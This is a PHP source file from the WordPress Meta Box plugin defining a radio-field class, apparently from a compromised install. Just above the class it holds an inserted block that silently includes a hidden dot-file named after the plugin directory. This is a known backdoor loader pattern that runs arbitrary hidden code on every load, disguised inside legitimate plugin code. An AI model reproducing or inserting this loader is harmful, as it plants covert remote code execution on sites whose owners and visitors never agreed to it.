<?php
/**
 * The radio field.
 *
 * @package Meta Box
 */

/**
 * Radio field class.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RWMB_Radio_Field extends RWMB_Input_List_Field {
	/**
	 * Normalize parameters for field.
	 *
	 * @param array $field Field parameters.
	 * @return array
	 */
	public static function normalize( $field ) {
		$field['multiple'] = false;
		$field             = parent::normalize( $field );

		return $field;
	}
}
